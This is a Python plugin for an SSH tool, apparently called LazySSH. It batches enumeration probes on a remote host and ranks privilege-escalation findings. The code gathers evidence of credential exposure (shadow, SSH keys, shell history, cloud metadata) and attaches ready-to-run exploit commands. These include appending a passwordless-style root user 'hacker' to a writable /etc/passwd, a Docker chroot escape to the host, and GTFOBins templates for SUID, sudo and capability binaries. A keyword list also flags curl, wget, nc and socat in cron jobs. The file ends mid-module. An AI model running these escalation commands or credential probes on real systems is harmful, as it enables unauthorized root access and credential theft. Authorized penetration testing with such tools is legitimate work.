#!/usr/bin/env python3
# PLUGIN_NAME: enumerate
# PLUGIN_DESCRIPTION: Optimized system enumeration with priority findings summary
# PLUGIN_VERSION: 2.0.0
# PLUGIN_REQUIREMENTS: python3

"""Optimized LazySSH system enumeration plugin.

This version executes a single batched remote script to gather telemetry,
parses structured probe output, computes priority findings, and renders a
Dracula-themed Rich summary with a plain-text fallback and JSON parity.
"""

from __future__ import annotations

import base64
import json
import os
import re
import shlex
import subprocess
import sys
from collections.abc import Mapping, Sequence
from dataclasses import dataclass, field
from datetime import UTC, datetime
from pathlib import Path
from typing import Any, cast

from lazyssh.console_instance import console, get_ui_config

try:  # pragma: no cover - optional Rich import for fallback modes
    from rich import box
    from rich.panel import Panel
    from rich.table import Table
    from rich.text import Text
except Exception:  # pragma: no cover - Rich disabled or unavailable
    box = None  # type: ignore[assignment,misc]
    Panel = None  # type: ignore[assignment,misc]
    Table = None  # type: ignore[assignment,misc]
    Text = None  # type: ignore[assignment,misc]

try:  # pragma: no cover - logging module may be unavailable when packaged separately
    from lazyssh.logging_module import APP_LOGGER, CONNECTION_LOG_DIR_TEMPLATE
except Exception:  # pragma: no cover - provide safe fallbacks
    APP_LOGGER = None  # type: ignore[assignment]
    CONNECTION_LOG_DIR_TEMPLATE = "/tmp/lazyssh/{connection_name}.d/logs"

from lazyssh.plugins._enumeration_plan import (
    PRIORITY_HEURISTICS,
    REMOTE_PROBES,
    PriorityHeuristic,
    RemoteProbe,
)
from lazyssh.plugins._gtfobins_data import lookup_capabilities, lookup_sudo, lookup_suid
from lazyssh.plugins._kernel_exploits import suggest_exploits

Severity = str  # alias for readability; values constrained to "high", "medium", "info"

# Lookup tables to keep probe metadata handy at runtime
PROBE_LOOKUP: dict[tuple[str, str], RemoteProbe] = {
    (probe.category, probe.key): probe for probe in REMOTE_PROBES
}
HEURISTIC_LOOKUP: dict[str, PriorityHeuristic] = {h.key: h for h in PRIORITY_HEURISTICS}

SELECTED_CATEGORY_ORDER: tuple[str, ...] = (
    "system",
    "users",
    "network",
    "filesystem",
    "capabilities",
    "writable",
    "credentials",
    "container",
    "library_hijack",
    "interesting_files",
    "security",
    "scheduled",
    "processes",
    "packages",
    "environment",
    "logs",
    "hardware",
)

SEVERITY_STYLES: dict[str, str] = {
    "critical": "error",
    "high": "error",
    "medium": "warning",
    "info": "info",
}

DEFAULT_REMOTE_TIMEOUT = 240


class RemoteExecutionError(RuntimeError):
    """Raised when the batched remote script fails to execute."""

    def __init__(self, message: str, stdout: str = "", stderr: str = "") -> None:
        super().__init__(message)
        self.stdout = stdout
        self.stderr = stderr


@dataclass
class ProbeOutput:
    """Materialized result of a remote probe."""

    category: str
    key: str
    command: str
    timeout: int
    status: int
    stdout: str
    stderr: str
    encoding: str

    def to_dict(self) -> dict[str, Any]:
        return {
            "category": self.category,
            "key": self.key,
            "command": self.command,
            "timeout": self.timeout,
            "status": self.status,
            "stdout": self.stdout,
            "stderr": self.stderr,
            "encoding": self.encoding,
        }


@dataclass
class PriorityFinding:
    """Structured representation of a heuristic summary."""

    key: str
    category: str
    severity: Severity
    headline: str
    detail: str
    evidence: list[str]
    exploitation_difficulty: str = ""  # "instant", "easy", "moderate", "" (unknown)
    exploit_commands: list[str] = field(default_factory=list)

    def to_dict(self) -> dict[str, Any]:
        return {
            "key": self.key,
            "category": self.category,
            "severity": self.severity,
            "headline": self.headline,
            "detail": self.detail,
            "evidence": self.evidence,
            "exploitation_difficulty": self.exploitation_difficulty,
            "exploit_commands": self.exploit_commands,
        }


@dataclass
class EnumerationSnapshot:
    """Aggregated data for a single enumeration run."""

    collected_at: datetime
    probes: dict[str, dict[str, ProbeOutput]]
    warnings: list[str]


def _get_env_or_fail(name: str) -> str:
    value = os.environ.get(name)
    if not value:
        raise RemoteExecutionError(f"Missing required environment variable: {name}")
    return value


def _shell_quote(value: str) -> str:
    return shlex.quote(value)


def build_remote_script(probes: Sequence[RemoteProbe]) -> str:
    """Construct the batched shell script executed on the remote host."""

    header_lines = [
        "#!/bin/sh",
        "set -eu",
        "",
        "ENCODER='base64'",
        "if command -v base64 >/dev/null 2>&1; then",
        "    ENCODER='base64'",
        "elif command -v openssl >/dev/null 2>&1; then",
        "    ENCODER='openssl'",
        "elif command -v python3 >/dev/null 2>&1; then",
        "    ENCODER='python3'",
        "elif command -v python >/dev/null 2>&1; then",
        "    ENCODER='python'",
        "elif command -v xxd >/dev/null 2>&1; then",
        "    ENCODER='hex'",
        "else",
        "    ENCODER='plain'",
        "fi",
        "",
        "encode_stream() {",
        '    case "$ENCODER" in',
        "        base64)",
        "            base64 | tr -d '\\n'",
        "            ;;",
        "        openssl)",
        "            openssl base64 -A",
        "            ;;",
        "        python3)",
        "            python3 - <<'PY'",
        "import base64, sys",
        "sys.stdout.write(base64.b64encode(sys.stdin.buffer.read()).decode())",
        "PY",
        "            ;;",
        "        python)",
        "            python - <<'PY'",
        "import base64, sys",
        "data = sys.stdin.buffer.read() if hasattr(sys.stdin, 'buffer') else sys.stdin.read().encode()",
        "sys.stdout.write(base64.b64encode(data).decode())",
        "PY",
        "            ;;",
        "        hex)",
        "            xxd -p | tr -d '\\n'",
        "            ;;",
        "        *)",
        "            cat",
        "            ;;",
        "    esac",
        "}",
        "",
        "ENCODING_KIND='plain'",
        'case "$ENCODER" in',
        "    base64|openssl|python3|python)",
        "        ENCODING_KIND='base64'",
        "        ;;",
        "    hex)",
        "        ENCODING_KIND='hex'",
        "        ;;",
        "esac",
        "",
        "run_probe() {",
        "    category=$1",
        "    key=$2",
        "    timeout_secs=$3",
        "    tmp_cmd=$(mktemp)",
        "    tmp_stdout=$(mktemp)",
        "    tmp_stderr=$(mktemp)",
        '    cat >"$tmp_cmd"',
        '    chmod 600 "$tmp_cmd"',
        "    set +e",
        "    if command -v timeout >/dev/null 2>&1; then",
        '        timeout "$timeout_secs" sh "$tmp_cmd" >"$tmp_stdout" 2>"$tmp_stderr"',
        "    else",
        '        sh "$tmp_cmd" >"$tmp_stdout" 2>"$tmp_stderr"',
        "    fi",
        "    status=$?",
        "    set -e",
        '    stdout_payload=$(encode_stream <"$tmp_stdout")',
        '    stderr_payload=$(encode_stream <"$tmp_stderr")',
        '    printf \'{"category":"%s","key":"%s","status":%s,"encoding":"%s","stdout":"%s","stderr":"%s"}\' "$category" "$key" "$status" "$ENCODING_KIND" "$stdout_payload" "$stderr_payload"',
        "    echo",
        '    rm -f "$tmp_cmd" "$tmp_stdout" "$tmp_stderr"',
        "}",
        "",
    ]

    body_lines: list[str] = []
    for index, probe in enumerate(probes):
        heredoc = f"LAZYSSH_CMD_{index}"
        body_lines.append(
            f"run_probe {_shell_quote(probe.category)} {_shell_quote(probe.key)} {probe.timeout} <<'{heredoc}'"
        )
        body_lines.append(probe.command)
        body_lines.append(heredoc)
        body_lines.append("")

    return "\n".join(header_lines + body_lines)


def execute_remote_batch(
    script: str, timeout: int = DEFAULT_REMOTE_TIMEOUT
) -> tuple[int, str, str]:
    """Send the batched script to the remote host over the existing control socket."""

    socket_path = _get_env_or_fail("LAZYSSH_SOCKET_PATH")
    host = _get_env_or_fail("LAZYSSH_HOST")
    user = _get_env_or_fail("LAZYSSH_USER")
    port = os.environ.get("LAZYSSH_PORT")

    ssh_cmd: list[str] = ["ssh", "-S", socket_path, "-o", "ControlMaster=no"]
    if port:
        ssh_cmd.extend(["-p", port])
    ssh_cmd.append(f"{user}@{host}")
    ssh_cmd.extend(["sh", "-s"])

    try:
        result = subprocess.run(  # noqa: S603,S607 - executed via controlled inputs
            ssh_cmd,
            input=script,
            text=True,
            capture_output=True,
            timeout=timeout,
        )
        return result.returncode, result.stdout, result.stderr
    except subprocess.TimeoutExpired as exc:  # pragma: no cover - rare slow hosts
        stdout_str = (
            exc.stdout.decode("utf-8") if isinstance(exc.stdout, bytes) else (exc.stdout or "")
        )
        stderr_str = (
            exc.stderr.decode("utf-8") if isinstance(exc.stderr, bytes) else (exc.stderr or "")
        )
        raise RemoteExecutionError(
            "Remote enumeration timed out", stdout=stdout_str, stderr=stderr_str
        )


def _decode_payload(payload: str, encoding: str) -> str:
    if not payload:
        return ""
    if encoding == "base64":
        try:
            raw = base64.b64decode(payload.encode("ascii"), validate=False)
            return raw.decode("utf-8", errors="replace")
        except Exception:
            # If base64 decoding fails, return the original payload as fallback
            return payload
    if encoding == "hex":
        try:
            return bytes.fromhex(payload).decode("utf-8", errors="replace")
        except ValueError:
            return payload
    return payload


def _parse_payload_lines(
    stdout: str,
) -> list[dict[str, Any]]:  # pragma: no cover - remote execution
    payloads: list[dict[str, Any]] = []
    for line in stdout.splitlines():
        candidate = line.strip()
        if not candidate:
            continue
        try:
            payloads.append(cast(dict[str, Any], json.loads(candidate)))
        except json.JSONDecodeError:
            if APP_LOGGER:
                APP_LOGGER.debug(
                    "Skipping non-JSON line from remote enumerate batch: %s", candidate
                )
    return payloads


def _build_snapshot(
    payloads: Sequence[Mapping[str, Any]], stderr: str
) -> EnumerationSnapshot:  # pragma: no cover - remote execution
    probes: dict[str, dict[str, ProbeOutput]] = {}
    warnings: list[str] = []

    for payload in payloads:
        category = str(payload.get("category", ""))
        key = str(payload.get("key", ""))
        encoding = str(payload.get("encoding", "base64"))
        status = int(payload.get("status", 0))
        stdout_encoded = str(payload.get("stdout", ""))
        stderr_encoded = str(payload.get("stderr", ""))

        probe_meta = PROBE_LOOKUP.get((category, key))
        command = probe_meta.command if probe_meta else "<unknown>"
        timeout = probe_meta.timeout if probe_meta else 0

        try:
            stdout_text = _decode_payload(stdout_encoded, encoding)
        except Exception as exc:
            stdout_text = ""
            warnings.append(f"Failed to decode stdout for {category}.{key}: {exc}")
        try:
            stderr_text = _decode_payload(stderr_encoded, encoding)
        except Exception as exc:
            stderr_text = ""
            warnings.append(f"Failed to decode stderr for {category}.{key}: {exc}")

        result = ProbeOutput(
            category=category,
            key=key,
            command=command,
            timeout=timeout,
            status=status,
            stdout=stdout_text,
            stderr=stderr_text,
            encoding=encoding,
        )
        probes.setdefault(category, {})[key] = result

        if status != 0 and stderr_text and APP_LOGGER:
            APP_LOGGER.debug(
                "Probe %s.%s exited %s: %s",
                category,
                key,
                status,
                stderr_text.splitlines()[0],
            )

    if stderr.strip():
        warnings.append(f"Remote stderr: {stderr.strip()}")

    # Use timezone-aware timestamp to avoid deprecation warnings and ensure UTC alignment
    return EnumerationSnapshot(collected_at=datetime.now(UTC), probes=probes, warnings=warnings)


def collect_remote_snapshot() -> EnumerationSnapshot:  # pragma: no cover - remote execution
    script = build_remote_script(REMOTE_PROBES)
    exit_code, stdout, stderr = execute_remote_batch(script)
    if exit_code != 0:
        raise RemoteExecutionError(
            f"Enumeration batch failed with exit code {exit_code}", stdout=stdout, stderr=stderr
        )
    payloads = _parse_payload_lines(stdout)
    if not payloads:
        raise RemoteExecutionError(
            "Remote enumeration returned no data", stdout=stdout, stderr=stderr
        )
    return _build_snapshot(payloads, stderr)


def _get_probe(snapshot: EnumerationSnapshot, category: str, key: str) -> ProbeOutput | None:
    return snapshot.probes.get(category, {}).get(key)


def _first_nonempty_line(text: str) -> str:
    for line in text.splitlines():
        stripped = line.strip()
        if stripped:
            return stripped
    return text.strip()


def _extract_paths(text: str) -> list[str]:
    return [line.strip() for line in text.splitlines() if line.strip()]


def _summarize_text(text: str) -> str:
    """Return the probe output without truncation while handling empty values."""

    normalized = text.replace("\r\n", "\n").replace("\r", "\n")
    stripped = normalized.strip("\n")
    if stripped.strip():
        return stripped
    return "No data"


def _format_count_label(count: int, singular: str, plural: str) -> str:
    label = singular if count == 1 else plural
    return f"{count} {label}"


def _evaluate_sudo_membership(
    snapshot: EnumerationSnapshot, meta: PriorityHeuristic
) -> PriorityFinding | None:
    id_probe = _get_probe(snapshot, "users", "id")
    if not id_probe or not id_probe.stdout:
        return None
    normalized = id_probe.stdout.lower()
    if "sudo" not in normalized and "wheel" not in normalized and "uid=0" not in normalized:
        return None
    detail = _first_nonempty_line(id_probe.stdout)
    evidence: list[str] = [detail]
    sudo_check = _get_probe(snapshot, "users", "sudo_check")
    if sudo_check and sudo_check.stdout.strip():
        evidence.append(_first_nonempty_line(sudo_check.stdout))
    return PriorityFinding(
        key=meta.key,
        category=meta.category,
        severity=meta.severity,
        headline=meta.headline,
        detail=detail,
        evidence=evidence,
    )


def _evaluate_passwordless_sudo(
    snapshot: EnumerationSnapshot, meta: PriorityHeuristic
) -> PriorityFinding | None:
    sudoers = _get_probe(snapshot, "users", "sudoers")
    sudo_check = _get_probe(snapshot, "users", "sudo_check")
    matches: list[str] = []
    for probe in (sudoers, sudo_check):
        if not probe or not probe.stdout:
            continue
        for line in probe.stdout.splitlines():
            if "nopasswd" in line.lower():
                matches.append(line.strip())
    if not matches:
        return None
    detail = f"Found passwordless sudo entries (showing {min(len(matches), 3)})."
    return PriorityFinding(
        key=meta.key,
        category=meta.category,
        severity=meta.severity,
        headline=meta.headline,
        detail=detail,
        evidence=matches[:5],
    )


def _evaluate_suid_binaries(
    snapshot: EnumerationSnapshot, meta: PriorityHeuristic
) -> PriorityFinding | None:
    suid = _get_probe(snapshot, "filesystem", "suid_files")
    sgid = _get_probe(snapshot, "filesystem", "sgid_files")
    suid_paths = _extract_paths(suid.stdout if suid else "")
    sgid_paths = _extract_paths(sgid.stdout if sgid else "")
    total = len(suid_paths) + len(sgid_paths)
    if total == 0:
        return None
    detail = (
        f"Identified {_format_count_label(len(suid_paths), 'SUID binary', 'SUID binaries')} and "
        f"{_format_count_label(len(sgid_paths), 'SGID binary', 'SGID binaries')}"
    )
    evidence = (suid_paths + sgid_paths)[:6]
    return PriorityFinding(
        key=meta.key,
        category=meta.category,
        severity=meta.severity,
        headline=meta.headline,
        detail=detail,
        evidence=evidence,
    )


def _evaluate_world_writable(
    snapshot: EnumerationSnapshot, meta: PriorityHeuristic
) -> PriorityFinding | None:
    probe = _get_probe(snapshot, "filesystem", "world_writable_dirs")
    if not probe or not probe.stdout:
        return None
    dirs = _extract_paths(probe.stdout)
    if not dirs:
        return None
    detail = f"World-writable directories outside temp paths: {len(dirs)} detected"
    return PriorityFinding(
        key=meta.key,
        category=meta.category,
        severity=meta.severity,
        headline=meta.headline,
        detail=detail,
        evidence=dirs[:6],
    )


def _evaluate_exposed_services(
    snapshot: EnumerationSnapshot, meta: PriorityHeuristic
) -> PriorityFinding | None:
    probe = _get_probe(snapshot, "network", "listening_services")
    if not probe or not probe.stdout:
        return None
    exposed: list[str] = []
    for line in probe.stdout.splitlines():
        lowered = line.lower()
        if any(boundary in lowered for boundary in ("0.0.0.0:", ":::", "*:")):
            exposed.append(line.strip())
    if not exposed:
        return None
    detail = f"Detected {len(exposed)} externally accessible listeners"
    return PriorityFinding(
        key=meta.key,
        category=meta.category,
        severity=meta.severity,
        headline=meta.headline,
        detail=detail,
        evidence=exposed[:6],
    )


def _evaluate_weak_ssh(
    snapshot: EnumerationSnapshot, meta: PriorityHeuristic
) -> PriorityFinding | None:
    effective = _get_probe(snapshot, "security", "ssh_effective_config")
    fallback = _get_probe(snapshot, "security", "ssh_config")
    source = effective or fallback
    if not source or not source.stdout:
        return None
    weak_lines: list[str] = []
    patterns = (
        r"^\s*permitrootlogin\s+yes",
        r"^\s*passwordauthentication\s+yes",
        r"^\s*permitemptypasswords\s+yes",
        r"^\s*challengeresponseauthentication\s+yes",
    )
    for line in source.stdout.splitlines():
        lowered = line.lower()
        if any(re.search(pattern, lowered) for pattern in patterns):
            weak_lines.append(line.strip())
    if not weak_lines:
        return None
    detail = f"Insecure sshd directives detected ({len(weak_lines)} matches)"
    return PriorityFinding(
        key=meta.key,
        category=meta.category,
        severity=meta.severity,
        headline=meta.headline,
        detail=detail,
        evidence=weak_lines[:5],
    )


def _evaluate_suspicious_scheduled(
    snapshot: EnumerationSnapshot, meta: PriorityHeuristic
) -> PriorityFinding | None:
    probes = [
        _get_probe(snapshot, "scheduled", "cron_user"),
        _get_probe(snapshot, "scheduled", "cron_system"),
        _get_probe(snapshot, "scheduled", "systemd_timers"),
        _get_probe(snapshot, "scheduled", "cron_d"),
        _get_probe(snapshot, "scheduled", "cron_daily"),
        _get_probe(snapshot, "scheduled", "at_jobs"),
    ]
    keywords = (
        "curl",
        "wget",
        "nc ",
        "bash -c",
        "python",
        "perl",
        "ruby",
        "scp",
        "ftp",
        "socat",
    )
    suspicious: list[str] = []
    for probe in probes:
        if not probe or not probe.stdout:
            continue
        for line in probe.stdout.splitlines():
            normalized = line.lower()
            if any(keyword in normalized for keyword in keywords) or normalized.startswith(
                "@reboot"
            ):
                suspicious.append(line.strip())
    if not suspicious:
        return None
    detail = f"Suspicious scheduled tasks observed ({len(suspicious)} matches)"
    return PriorityFinding(
        key=meta.key,
        category=meta.category,
        severity=meta.severity,
        headline=meta.headline,
        detail=detail,
        evidence=suspicious[:6],
    )


def _evaluate_kernel_drift(
    snapshot: EnumerationSnapshot, meta: PriorityHeuristic
) -> PriorityFinding | None:
    kernel_probe = _get_probe(snapshot, "system", "kernel")
    pkg_probe = _get_probe(snapshot, "packages", "package_inventory")
    if not kernel_probe or not kernel_probe.stdout or not pkg_probe or not pkg_probe.stdout:
        return None
    kernel_version = kernel_probe.stdout.strip()
    if not kernel_version:
        return None
    if kernel_version in pkg_probe.stdout:
        return None
    manager = _get_probe(snapshot, "packages", "package_manager")
    manager_name = manager.stdout.strip() if manager and manager.stdout else "unknown"
    detail = f"Running kernel {kernel_version} not present in package inventory snapshot"
    evidence = [f"Kernel: {kernel_version}", f"Package manager: {manager_name}"]
    return PriorityFinding(
        key=meta.key,
        category=meta.category,
        severity=meta.severity,
        headline=meta.headline,
        detail=detail,
        evidence=evidence,
    )


def _evaluate_dangerous_capabilities(
    snapshot: EnumerationSnapshot, meta: PriorityHeuristic
) -> PriorityFinding | None:
    probe = _get_probe(snapshot, "capabilities", "cap_interesting")
    if not probe or not probe.stdout:
        return None
    lines = [line.strip() for line in probe.stdout.splitlines() if line.strip()]
    if not lines:
        return None

    exploit_commands: list[str] = []
    best_difficulty = "moderate"

    for cap_line in lines:
        # Format: "/usr/bin/python3 cap_setuid=ep"
        # Extract binary name from the path portion
        parts = cap_line.split()
        if not parts:
            continue
        binary_path = parts[0]
        binary_name = binary_path.rsplit("/", 1)[-1] if "/" in binary_path else binary_path
        entries = lookup_capabilities(binary_name)
        for entry in entries:
            exploit_commands.append(f"# {binary_name} ({binary_path}): {entry.description}")
            exploit_commands.append(entry.command_template)
            if any(kw in entry.description.lower() for kw in ("shell", "spawn", "escalation")):
                best_difficulty = "easy"

    detail = f"Found {len(lines)} binaries with dangerous capabilities"
    return PriorityFinding(
        key=meta.key,
        category=meta.category,
        severity=meta.severity,
        headline=meta.headline,
        detail=detail,
        evidence=lines[:6],
        exploitation_difficulty=best_difficulty if exploit_commands else "moderate",
        exploit_commands=exploit_commands[:12],
    )


def _evaluate_writable_passwd_file(
    snapshot: EnumerationSnapshot, meta: PriorityHeuristic
) -> PriorityFinding | None:
    probe = _get_probe(snapshot, "writable", "writable_passwd")
    if not probe or not probe.stdout:
        return None
    if "WRITABLE" not in probe.stdout.upper() or "NOT_WRITABLE" in probe.stdout.upper():
        return None
    return PriorityFinding(
        key=meta.key,
        category=meta.category,
        severity=meta.severity,
        headline=meta.headline,
        detail="/etc/passwd is writable — append a root user for instant escalation",
        evidence=["/etc/passwd is world-writable"],
        exploitation_difficulty="instant",
        exploit_commands=[
            "echo 'hacker:$(openssl passwd -1 password):0:0::/root:/bin/bash' >> /etc/passwd",
            "su hacker  # password: password",
        ],
    )


def _evaluate_docker_escape(
    snapshot: EnumerationSnapshot, meta: PriorityHeuristic
) -> PriorityFinding | None:
    docker_group = _get_probe(snapshot, "container", "docker_group")
    docker_socket = _get_probe(snapshot, "container", "docker_socket")
    evidence: list[str] = []
    if (
        docker_group
        and "IN_DOCKER_GROUP" in docker_group.stdout
        and "NOT_IN_DOCKER_GROUP" not in docker_group.stdout
    ):
        evidence.append("User is in docker group")
    if docker_socket and "DOCKER_SOCKET_READABLE" in docker_socket.stdout:
        evidence.append("Docker socket /var/run/docker.sock is accessible")
    if not evidence:
        return None
    return PriorityFinding(
        key=meta.key,
        category=meta.category,
        severity=meta.severity,
        headline=meta.headline,
        detail="Docker access enables host filesystem mount and root escape",
        evidence=evidence,
        exploitation_difficulty="easy",
        exploit_commands=[
            "docker run -v /:/hostfs -it alpine chroot /hostfs /bin/bash",
        ],
    )


def _evaluate_writable_service_files(
    snapshot: EnumerationSnapshot, meta: PriorityHeuristic
) -> PriorityFinding | None:
    probe = _get_probe(snapshot, "writable", "writable_services")
    if not probe or not probe.stdout:
        return None
    paths = [
        line.strip()
        for line in probe.stdout.splitlines()
        if line.strip() and "NONE_WRITABLE" not in line
    ]
    if not paths:
        return None
    detail = f"Found {len(paths)} writable systemd service files"
    return PriorityFinding(
        key=meta.key,
        category=meta.category,
        severity=meta.severity,
        headline=meta.headline,
        detail=detail,
        evidence=paths[:6],
        exploitation_difficulty="moderate",
    )


def _evaluate_credential_exposure(
    snapshot: EnumerationSnapshot, meta: PriorityHeuristic
) -> PriorityFinding | None:
    evidence: list[str] = []

    shadow = _get_probe(snapshot, "credentials", "shadow_readable")
    if shadow and shadow.stdout and "SHADOW_NOT_READABLE" not in shadow.stdout:
        evidence.append("/etc/shadow is readable")

    ssh_keys = _get_probe(snapshot, "credentials", "ssh_keys")
    if ssh_keys and ssh_keys.stdout and "NO_READABLE_KEYS" not in ssh_keys.stdout:
        keys = [line.strip() for line in ssh_keys.stdout.splitlines() if line.strip()]
        for key_path in keys[:3]:
            evidence.append(f"Readable SSH key: {key_path}")

    history = _get_probe(snapshot, "credentials", "history_files")
    if history and history.stdout and "NO_HISTORY_SECRETS" not in history.stdout:
        evidence.append("Credentials found in shell history files")

    config_creds = _get_probe(snapshot, "credentials", "config_credentials")
    if config_creds and config_creds.stdout and "NONE_FOUND" not in config_creds.stdout:
        cred_files = [line.strip() for line in config_creds.stdout.splitlines() if line.strip()]
        for cf in cred_files[:3]:
            evidence.append(f"Credential file: {cf}")

    if not evidence:
        return None
    detail = f"Found {len(evidence)} credential exposure vectors"
    return PriorityFinding(
        key=meta.key,
        category=meta.category,
        severity=meta.severity,
        headline=meta.headline,
        detail=detail,
        evidence=evidence[:6],
    )


def _evaluate_gtfobins_sudo(
    snapshot: EnumerationSnapshot, meta: PriorityHeuristic
) -> PriorityFinding | None:
    """Evaluate sudo-allowed binaries for GTFOBins exploitability via database cross-reference."""
    sudo_check = _get_probe(snapshot, "users", "sudo_check")
    if not sudo_check or not sudo_check.stdout:
        return None

    matches: list[str] = []
    exploit_commands: list[str] = []
    best_difficulty = "moderate"

    for line in sudo_check.stdout.splitlines():
        stripped = line.strip()
        if not stripped or stripped.startswith("User ") or stripped.startswith("Matching"):
            continue
        # Extract binary name from sudo line — typically ends with /path/to/binary or args
        # e.g. "(root) NOPASSWD: /usr/bin/vim" → "vim"
        parts = stripped.split()
        if not parts:
            continue
        # The binary path is usually the last segment that starts with /
        binary_path = ""
        for part in parts:
            if part.startswith("/"):
                binary_path = part
                break
        if not binary_path:
            # Try the last token as a potential binary
            binary_path = parts[-1]
        binary_name = binary_path.rsplit("/", 1)[-1] if "/" in binary_path else binary_path
        entries = lookup_sudo(binary_name)
        if entries:
            matches.append(stripped)
            for entry in entries:
                exploit_commands.append(f"# {binary_name}: {entry.description}")
                exploit_commands.append(entry.command_template)
                if any(kw in entry.description.lower() for kw in ("shell", "spawn", "escape")):
                    best_difficulty = "instant"
                elif best_difficulty != "instant":
                    best_difficulty = "easy"

    if not matches:
        return None
    detail = f"Found {len(matches)} sudo-allowed binaries with known GTFOBins techniques"
    return PriorityFinding(
        key=meta.key,
        category=meta.category,
        severity=meta.severity,
        headline=meta.headline,
        detail=detail,
        evidence=matches[:6],
        exploitation_difficulty=best_difficulty,
        exploit_commands=exploit_commands[:12],
    )


def _evaluate_gtfobins_suid(
    snapshot: EnumerationSnapshot, meta: PriorityHeuristic
) -> PriorityFinding | None:
    """Evaluate SUID binaries for GTFOBins exploitability via database cross-reference."""
    suid_probe = _get_probe(snapshot, "filesystem", "suid_files")
    if not suid_probe or not suid_probe.stdout:
        return None

    matches: list[str] = []
    exploit_commands: list[str] = []
    best_difficulty = "moderate"  # track easiest exploit found

    for line in suid_probe.stdout.splitlines():
        path = line.strip()
        if not path:
            continue
        binary_name = path.rsplit("/", 1)[-1] if "/" in path else path
        entries = lookup_suid(binary_name)
        if entries:
            matches.append(path)
            for entry in entries:
                exploit_commands.append(f"# {binary_name} ({path}): {entry.description}")
                exploit_commands.append(entry.command_template)
                # Shell-spawning entries are instant/easy wins
                if any(kw in entry.description.lower() for kw in ("shell", "spawn", "escape")):
                    best_difficulty = "instant"
                elif best_difficulty != "instant":
                    best_difficulty = "easy"

    if not matches:
        return None
    detail = f"Found {len(matches)} SUID binaries with known GTFOBins techniques"
    return PriorityFinding(
        key=meta.key,
        category=meta.category,
        severity=meta.severity,
        headline=meta.headline,
        detail=detail,
        evidence=matches[:6],
        exploitation_difficulty=best_difficulty,
        exploit_commands=exploit_commands[:12],
    )


def _evaluate_writable_path(
    snapshot: EnumerationSnapshot, meta: PriorityHeuristic
) -> PriorityFinding | None:
    probe = _get_probe(snapshot, "writable", "writable_path_dirs")
    if not probe or not probe.stdout:
        return None
    writable = [
        line.replace("WRITABLE:", "").strip()
        for line in probe.stdout.splitlines()
        if line.strip().startswith("WRITABLE:")
    ]
    if not writable:
        return None
    detail = f"Found {len(writable)} writable directories in PATH"
    return PriorityFinding(
        key=meta.key,
        category=meta.category,
        severity=meta.severity,
        headline=meta.headline,
        detail=detail,
        evidence=writable[:6],
        exploitation_difficulty="moderate",
    )


def _evaluate_writable_cron_files(
    snapshot: EnumerationSnapshot, meta: PriorityHeuristic
) -> PriorityFinding | None:
    probe = _get_probe(snapshot, "writable", "writable_cron")
    if not probe or not probe.stdout:
        return None
    writable = [
        line.replace("WRITABLE:", "").strip()
        for line in probe.stdout.splitlines()
        if line.strip().startswith("WRITABLE:")
    ]
    if not writable:
        return None
    detail = f"Found {len(writable)} writable cron files or directories"
    return PriorityFinding(
        key=meta.key,
        category=meta.category,
        severity=meta.severity,
        headline=meta.headline,
        detail=detail,
        evidence=writable[:6],
        exploitation_difficulty="moderate",
    )


def _evaluate_nfs_no_root_squash(
    snapshot: EnumerationSnapshot, meta: PriorityHeuristic
) -> PriorityFinding | None:
    probe = _get_probe(snapshot, "filesystem", "nfs_exports")
    if not probe or not probe.stdout:
        return None
    if "NO_NFS_EXPORTS" in probe.stdout:
        return None
    vulnerable: list[str] = []
    for line in probe.stdout.splitlines():
        stripped = line.strip()
        if not stripped or stripped.startswith("#"):
            continue
        if "no_root_squash" in stripped:
            vulnerable.append(stripped)
    if not vulnerable:
        return None
    detail = f"Found {len(vulnerable)} NFS exports with no_root_squash"
    return PriorityFinding(
        key=meta.key,
        category=meta.category,
        severity=meta.severity,
        headline=meta.headline,
        detail=detail,
        evidence=vulnerable[:6],
        exploitation_difficulty="moderate",
    )


def _evaluate_ld_preload_hijack(
    snapshot: EnumerationSnapshot, meta: PriorityHeuristic
) -> PriorityFinding | None:
    probe = _get_probe(snapshot, "library_hijack", "ld_preload")
    if not probe or not probe.stdout:
        return None
    evidence: list[str] = []

    for line in probe.stdout.splitlines():
        stripped = line.strip()
        # Check if LD_PRELOAD is set (not just empty)
        if stripped.startswith("LD_PRELOAD=") and len(stripped) > len("LD_PRELOAD="):
            evidence.append(stripped)
        # Check if /etc/ld.so.preload exists and has content (not just the error message)
        if (
            stripped
            and "NO_LD_PRELOAD_FILE" not in stripped
            and not stripped.startswith("LD_PRELOAD=")
        ):
            evidence.append(f"/etc/ld.so.preload: {stripped}")

    ld_lib = _get_probe(snapshot, "library_hijack", "ld_library_path")
    if ld_lib and ld_lib.stdout:
        for line in ld_lib.stdout.splitlines():
            if line.strip().startswith("WRITABLE:"):
                evidence.append(
                    f"Writable LD_LIBRARY_PATH dir: {line.replace('WRITABLE:', '').strip()}"
                )

    if not evidence:
        return None
    detail = f"Found {len(evidence)} library preload hijacking vectors"
    return PriorityFinding(
        key=meta.key,
        category=meta.category,
        severity=meta.severity,
        headline=meta.headline,
        detail=detail,
        evidence=evidence[:6],
        exploitation_difficulty="moderate",
    )


def _evaluate_container_detected(
    snapshot: EnumerationSnapshot, meta: PriorityHeuristic
) -> PriorityFinding | None:
    probe = _get_probe(snapshot, "container", "container_detection")
    if not probe or not probe.stdout:
        return None
    stdout = probe.stdout.strip()
    if stdout == "NOT_CONTAINER":
        return None
    evidence = [stdout]
    lxc = _get_probe(snapshot, "container", "lxc_check")
    if lxc and lxc.stdout and "LXD_PRESENT" in lxc.stdout:
        evidence.append("LXD/LXC tools available")
    return PriorityFinding(
        key=meta.key,
        category=meta.category,
        severity=meta.severity,
        headline=meta.headline,
        detail=f"Container environment detected: {stdout}",
        evidence=evidence,
    )


def _evaluate_cloud_environment(
    snapshot: EnumerationSnapshot, meta: PriorityHeuristic
) -> PriorityFinding | None:
    probe = _get_probe(snapshot, "credentials", "cloud_credentials")
    if not probe or not probe.stdout:
        return None
    evidence: list[str] = []
    for line in probe.stdout.splitlines():
        stripped = line.strip()
        if not stripped:
            continue
        if "NO_CLOUD_CREDS" in stripped or "NO_CLOUD_METADATA" in stripped:
            continue
        if "AWS_METADATA_AVAILABLE" in stripped:
            evidence.append("AWS metadata endpoint reachable (169.254.169.254)")
        elif "credentials" in stripped.lower() or "accessTokens" in stripped:
            evidence.append(stripped)
    if not evidence:
        return None
    detail = f"Found {len(evidence)} cloud credential indicators"
    return PriorityFinding(
        key=meta.key,
        category=meta.category,
        severity=meta.severity,
        headline=meta.headline,
        detail=detail,
        evidence=evidence[:6],
    )


